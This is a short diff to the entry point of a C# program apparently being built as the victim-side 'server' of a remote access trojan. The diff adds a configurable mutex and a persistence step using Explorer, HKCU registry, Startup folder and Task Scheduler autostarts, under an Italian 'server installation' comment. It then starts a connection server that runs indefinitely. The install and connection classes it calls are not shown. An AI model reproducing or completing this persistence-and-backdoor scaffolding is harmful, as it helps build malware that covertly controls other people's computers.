@@ -2,6 +2,7 @@
 using System.Diagnostics;
 using System.Reflection;
 using System.Threading;
+using bc.srv.Class;
 
 namespace bc.srv
 {
@@ -12,14 +13,33 @@ namespace bc.srv
             AppDomain.CurrentDomain.UnhandledException += CurrentDomain_UnhandledException;
             
             // todo init st_client
+            SrvData.Instance.ServerVersion = "0.2.0";
 
-            using (var mutex = new Mutex(false, "todo"))
+            CreateStClient.InitializeStClient();
+
+            using (var mutex = new Mutex(false, SrvData.Instance.sMutex))
             {
                 if (!mutex.WaitOne(0, false))
                     return;
 
+                // INSTALLAZIONE SERVER
+                if (SrvData.Instance.bUseExplorer || SrvData.Instance.bUseHKCU ||
+                    SrvData.Instance.bUseStartupFolder || SrvData.Instance.UseTaskScheduler)
+                {
+                    var ins = new InstallClass();
+                    ins.StartInstallTHread();
+                }
+                //-----------------------------------------------
 
-                // start all
+
+                // START SERVER
+                var con = new Connection();
+                con.StartServer();
+
+                while (true)
+                {
+                    Thread.Sleep(2000);
+                }
             }
 
         }
